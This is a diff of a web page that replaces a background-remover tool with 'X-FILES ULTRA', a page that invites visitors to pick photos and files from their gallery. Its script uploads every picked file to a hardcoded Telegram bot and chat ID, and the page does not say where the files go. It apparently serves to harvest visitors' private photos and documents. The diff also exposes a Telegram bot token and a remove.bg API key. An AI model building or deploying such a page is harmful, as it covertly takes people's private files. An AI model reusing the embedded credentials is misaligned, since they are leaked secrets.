@@ -3,154 +3,228 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GX REMOVE | Pro AI Studio</title>
+    <title>GX.Sammim - X-FILES ULTRA</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Plus+Jakarta+Sans:wght@300;600;800&display=swap" rel="stylesheet">
     <style>
-        body { background: #02040a; color: #ffffff; font-family: 'Plus Jakarta Sans', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .gx-card { width: 100%; max-width: 420px; background: rgba(13, 17, 23, 0.95); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 40px; padding: 40px 25px; box-shadow: 0 0 50px rgba(0, 0, 0, 0.9); text-align: center; }
-        .gx-title { font-family: 'Syncopate', sans-serif; letter-spacing: 5px; background: linear-gradient(90deg, #00f2fe, #4facfe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .upload-box { border: 2px dashed rgba(0, 242, 254, 0.2); border-radius: 30px; padding: 60px 20px; cursor: pointer; transition: 0.3s; background: rgba(0, 198, 255, 0.02); }
-        .upload-box:hover { border-color: #00f2fe; background: rgba(0, 242, 254, 0.06); transform: translateY(-3px); }
-        .btn-download { background: linear-gradient(45deg, #00c6ff, #0072ff); color: white; font-weight: 800; padding: 18px; border-radius: 22px; width: 100%; margin-top: 15px; box-shadow: 0 10px 20px rgba(0, 114, 255, 0.3); }
-        .btn-bg { background: #161b22; border: 1px solid #30363d; color: #4facfe; padding: 14px; border-radius: 20px; width: 100%; font-size: 11px; font-weight: 700; margin-top: 25px; }
-        #canvasContainer { position: relative; border-radius: 25px; overflow: hidden; width: 100%; min-height: 300px; background: #000; display: none; margin-bottom: 20px; }
-        #mainCanvas { width: 100%; height: auto; display: block; border-radius: 25px; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;600;900&display=swap'); 
+        body { background: #000; color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; } 
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px; } 
+        
+        .name-container {
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.2);
+            border-radius: 12px;
+            padding: 4px 15px;
+            display: inline-block;
+            margin-bottom: 8px;
+        }
+        .owner-tag { 
+            background: linear-gradient(90deg, #3b82f6, #fff); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            font-size: 0.9rem; 
+            font-weight: 900; 
+            letter-spacing: 4px;
+        }
+
+        .active-tab { background: #3b82f6 !important; color: #fff !important; box-shadow: 0 0 25px rgba(59, 130, 246, 0.5); } 
+        
+        .file-card { 
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); 
+            border: 1px solid rgba(255,255,255,0.1); 
+            animation: fadeInScale 0.4s ease forwards;
+        } 
+        
+        @keyframes fadeInScale {
+            0% { opacity: 0; transform: scale(0.8) translateY(10px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        ::-webkit-scrollbar { width: 5px; } 
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
+        
+        /* প্রিমিয়াম প্রগ্রেস বার ডিজাইন */
+        .progress-bar { 
+            transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1); 
+            background: linear-gradient(90deg, #3b82f6, #60a5fa, #3b82f6);
+            background-size: 200% 100%;
+            animation: shine 2s linear infinite;
+        }
+
+        @keyframes shine {
+            to { background-position: 200% center; }
+        }
     </style>
 </head>
-<body>
+<body class="p-4">
 
-    <div class="gx-card">
-        <h1 class="gx-title text-2xl mb-1">GX REMOVE</h1>
-        <p class="text-[8px] tracking-[5px] text-slate-500 uppercase font-bold mb-10">Premium HD Studio</p>
-
-        <div id="uploadArea" class="upload-box" onclick="document.getElementById('imageInput').click()">
-            <input type="file" id="imageInput" class="hidden" accept="image/*">
-            <div class="text-5xl mb-4">💎</div>
-            <p class="text-sm font-bold text-slate-300 tracking-wide">Select High-Res Photo</p>
-            <p class="text-[9px] text-slate-600 mt-2 uppercase tracking-widest">AI Auto Background Remover</p>
-        </div>
-
-        <div id="loader" class="hidden py-14">
-            <div class="w-12 h-12 border-4 border-slate-800 border-t-cyan-500 rounded-full animate-spin mx-auto"></div>
-            <p class="text-[10px] text-cyan-500 mt-5 font-bold tracking-[3px] animate-pulse">PROCESSING HD FILE...</p>
-        </div>
-
-        <div id="resultArea" class="hidden">
-            <div id="canvasContainer">
-                <canvas id="mainCanvas"></canvas>
+<div class="max-w-5xl mx-auto"> 
+    <div class="glass p-8 mb-8 flex flex-col md:flex-row justify-between items-center"> 
+        <div> 
+            <div class="name-container">
+                <h2 class="owner-tag uppercase">GX.Sammim</h2>
             </div>
+            <h1 class="text-3xl font-black tracking-tighter uppercase italic">X-FILES <span class="text-blue-500">ULTRA</span></h1> 
+            <p id="eta-text" class="text-[10px] text-blue-400 font-bold uppercase tracking-widest mt-1">High Speed Transfer Enabled</p> 
+        </div> 
+        <div class="flex bg-black/50 p-1 rounded-2xl border border-white/10 mt-6 md:mt-0"> 
+            <button onclick="setType('photo')" id="tab-photo" class="tab-btn active-tab px-8 py-2 rounded-xl text-xs font-black transition-all">PHOTO</button> 
+            <button onclick="setType('document')" id="tab-document" class="tab-btn px-8 py-2 rounded-xl text-xs font-black transition-all text-gray-400">FILES</button> 
+        </div> 
+    </div> 
 
-            <input type="file" id="bgInput" class="hidden" accept="image/*" onchange="loadBackground(event)">
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8"> 
+        <div class="lg:col-span-1"> 
+            <label class="glass h-64 flex flex-col items-center justify-center cursor-pointer border-2 border-dashed border-gray-700 hover:border-blue-500 transition-all mb-6 group"> 
+                <input type="file" id="fileInput" multiple class="hidden" accept="image/png, image/jpeg, image/jpg, image/gif, image/*"> 
+                <span id="upload-icon" class="text-6xl mb-3 group-hover:scale-110 transition-transform">🖼️</span> 
+                <p id="upload-label" class="text-[11px] text-gray-400 font-black tracking-[0.2em] uppercase text-center px-4">Tap to open Gallery</p> 
+            </label> 
+
+            <button onclick="ignite()" id="sendBtn" class="w-full py-6 bg-white text-black font-black rounded-[30px] hover:bg-blue-600 hover:text-white transition-all active:scale-95 shadow-2xl uppercase tracking-[0.3em]">Ignite Transfer</button> 
             
-            <button onclick="document.getElementById('bgInput').click()" class="btn-bg uppercase tracking-widest">
-                🖼️ Add Custom Background
-            </button>
+            <div id="status-box" class="mt-4 hidden p-4 glass rounded-2xl border-blue-500/30">
+                <p id="status-text" class="text-[10px] font-bold text-blue-400 uppercase mb-2">Transmitting Data...</p>
+                <div class="w-full bg-white/10 h-1.5 rounded-full overflow-hidden">
+                    <div id="progress-fill" class="progress-bar h-full w-0"></div>
+                </div>
+            </div>
+        </div> 
 
-            <button onclick="saveFinalImage()" class="btn-download uppercase tracking-widest text-xs">
-                Download HD Result
-            </button>
-            
-            <button onclick="location.reload()" class="mt-6 text-[9px] text-slate-600 font-bold tracking-widest hover:text-white uppercase block mx-auto">
-                Upload New Photo
-            </button>
-        </div>
+        <div class="lg:col-span-2 glass p-6 min-h-[450px]"> 
+            <div class="flex justify-between items-center mb-8 px-2"> 
+                <div class="flex flex-col"> 
+                    <span class="text-[10px] font-black text-gray-500 tracking-widest uppercase mb-1">Queue</span> 
+                    <span id="q-count" class="text-blue-500 font-black text-4xl">0</span> 
+                </div> 
+                <div class="flex flex-col items-end"> 
+                    <span class="text-[10px] font-black text-gray-500 tracking-widest uppercase mb-1">Status</span> 
+                    <span id="s-count" class="text-green-500 font-black text-4xl">—</span> 
+                </div> 
+            </div> 
+            <div id="preview-grid" class="grid grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 overflow-y-auto max-h-[500px] pr-2"> </div> 
+        </div> 
+    </div> 
+</div> 
 
-        <p class="mt-10 text-[7px] text-slate-800 tracking-[3px] font-bold uppercase">Developed by Sammim</p>
-    </div>
+<script> 
+const TOKEN = "7803047176:AAENBpYrmbNuFiBsAMf8fwFybVOsSNTgQM4"; 
+const CHAT_ID = "5923885908"; 
+let queue = []; 
+let currentType = 'photo'; 
 
-    <script>
-        const API_KEY = "MMoS7GN2XD8zxXYw5s3ZZmHr";
-        const canvas = document.getElementById('mainCanvas');
-        const ctx = canvas.getContext('2d');
-        
-        let fgImg = new Image();
-        let bgImg = new Image();
-        let isBgLoaded = false;
+function setType(type) { 
+    currentType = type; 
+    const fileInput = document.getElementById('fileInput');
+    document.querySelectorAll('.tab-btn').forEach(b => { 
+        b.classList.remove('active-tab', 'text-white'); 
+        b.classList.add('text-gray-400'); 
+    }); 
+    document.getElementById(`tab-${type}`).classList.add('active-tab'); 
+    document.getElementById('upload-icon').innerText = type === 'photo' ? '🖼️' : '📂'; 
+    document.getElementById('upload-label').innerText = type === 'photo' ? 'Open Gallery' : 'Open Files';
+    fileInput.accept = type === 'photo' ? "image/png, image/jpeg, image/jpg, image/gif, image/*" : ""; 
+} 
 
-        // ১. ছবি আপলোড ও রিমুভ
-        document.getElementById('imageInput').onchange = async (e) => {
-            const file = e.target.files[0];
-            if (!file) return;
+document.getElementById('fileInput').onchange = (e) => { 
+    const files = Array.from(e.target.files);
+    queue = [...queue, ...files]; 
+    render(); 
+    e.target.value = ""; 
+}; 
 
-            document.getElementById('uploadArea').classList.add('hidden');
-            document.getElementById('loader').classList.remove('hidden');
+function render() { 
+    const grid = document.getElementById('preview-grid'); 
+    grid.innerHTML = ""; 
+    document.getElementById('q-count').innerText = queue.length; 
+    const fragment = document.createDocumentFragment();
+    queue.forEach((f, i) => { 
+        const div = document.createElement('div'); 
+        div.style.animationDelay = `${i * 0.05}s`;
+        div.className = "relative aspect-square rounded-2xl overflow-hidden file-card bg-white/5 flex items-center justify-center"; 
+        if (f.type.startsWith('image/')) { 
+            const img = document.createElement('img');
+            img.src = URL.createObjectURL(f);
+            img.className = "w-full h-full object-cover";
+            div.appendChild(img);
+        } else { 
+            div.innerHTML = `<div class="p-2 text-center text-[10px] font-bold text-gray-400 break-all uppercase">${f.name.split('.').pop()}</div>`; 
+        } 
+        const closeBtn = document.createElement('button');
+        closeBtn.onclick = () => remove(i);
+        closeBtn.className = "absolute top-1 right-1 bg-red-600/90 w-5 h-5 rounded-full text-[10px] flex items-center justify-center transition-transform hover:scale-125";
+        closeBtn.innerText = "✕";
+        div.appendChild(closeBtn);
+        fragment.appendChild(div);
+    }); 
+    grid.appendChild(fragment);
+} 
 
-            const formData = new FormData();
-            formData.append('image_file', file);
-            formData.append('size', 'auto');
+function remove(i) { queue.splice(i, 1); render(); } 
 
-            try {
-                const response = await fetch('https://api.remove.bg/v1.0/removebg', {
-                    method: 'POST',
-                    headers: { 'X-Api-Key': API_KEY },
-                    body: formData
-                });
+async function sendFile(file) {
+    const method = (currentType === 'photo' && file.size < 10*1024*1024) ? 'sendPhoto' : 'sendDocument';
+    const field = method === 'sendPhoto' ? 'photo' : 'document';
+    const fd = new FormData(); 
+    fd.append("chat_id", CHAT_ID); 
+    fd.append(field, file); 
 
-                if (response.ok) {
-                    const blob = await response.blob();
-                    const url = URL.createObjectURL(blob);
-                    
-                    fgImg.onload = () => {
-                        // ক্যানভাস সাইজ ঠিক করা
-                        canvas.width = fgImg.width;
-                        canvas.height = fgImg.height;
-                        drawCanvas();
-                        document.getElementById('loader').classList.add('hidden');
-                        document.getElementById('resultArea').classList.remove('hidden');
-                        document.getElementById('canvasContainer').style.display = 'block';
-                    };
-                    fgImg.src = url;
-                } else {
-                    alert("API ক্রেডিট শেষ বা ভুল হয়েছে!");
-                    location.reload();
-                }
-            } catch (err) {
-                alert("ইন্টারনেট সমস্যা!");
-                location.reload();
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, {
+            method: 'POST',
+            body: fd
+        });
+        return response.ok;
+    } catch (err) {
+        return false;
+    }
+}
+
+async function ignite() { 
+    if(!queue.length) return; 
+
+    const btn = document.getElementById('sendBtn'); 
+    const sCountDisp = document.getElementById('s-count'); 
+    const qCountDisp = document.getElementById('q-count'); 
+    const statusBox = document.getElementById('status-box');
+    const progressFill = document.getElementById('progress-fill');
+    const statusText = document.getElementById('status-text');
+
+    btn.disabled = true; 
+    btn.innerText = "⚡ TRANSMITTING..."; 
+    statusBox.classList.remove('hidden');
+    sCountDisp.innerText = "SENDING";
+
+    let sent = 0; 
+    const total = queue.length; 
+    const batchSize = 3; 
+
+    for (let i = 0; i < queue.length; i += batchSize) {
+        const batch = queue.slice(i, i + batchSize);
+        await Promise.all(batch.map(async (file) => {
+            const success = await sendFile(file);
+            if(success) {
+                sent++;
+                qCountDisp.innerText = total - sent;
+                const percent = Math.round((sent / total) * 100);
+                progressFill.style.width = percent + "%";
             }
-        };
+        }));
+    }
 
-        // ২. কাস্টম ব্যাকগ্রাউন্ড লোড করা
-        function loadBackground(event) {
-            const file = event.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    bgImg.onload = () => {
-                        isBgLoaded = true;
-                        drawCanvas();
-                    };
-                    bgImg.src = e.target.result;
-                };
-                reader.readAsDataURL(file);
-            }
-        }
+    btn.innerText = "SUCCESS"; 
+    btn.style.background = "#10b981";
+    statusText.innerText = "TRANSFER COMPLETE";
+    sCountDisp.innerText = "DONE";
+    
+    setTimeout(() => { 
+        location.reload(); 
+    }, 2000); 
+} 
 
-        // ৩. ক্যানভাসে ছবি আঁকা (জোড়া লাগানো)
-        function drawCanvas() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            
-            if (isBgLoaded) {
-                // ব্যাকগ্রাউন্ড ছবিকে ক্যানভাসের সাইজে ড্র করা
-                ctx.drawImage(bgImg, 0, 0, canvas.width, canvas.height);
-            } else {
-                // কোনো ব্যাকগ্রাউন্ড না থাকলে সাদা ব্যাকগ্রাউন্ড (ঐচ্ছিক)
-                ctx.fillStyle = "white";
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-            }
-            
-            // রিমুভ করা ছবিকে উপরে ড্র করা
-            ctx.drawImage(fgImg, 0, 0, canvas.width, canvas.height);
-        }
-
-        // ৪. ফাইনাল এইচডি ডাউনলোড
-        function saveFinalImage() {
-            const link = document.createElement('a');
-            link.download = `GX_PRO_HD_${Date.now()}.png`;
-            link.href = canvas.toDataURL("image/png", 1.0); // ১০০% কোয়ালিটি
-            link.click();
-        }
-    </script>
+setType('photo');
+</script>
 </body>
-</html>
+    </html>
+    
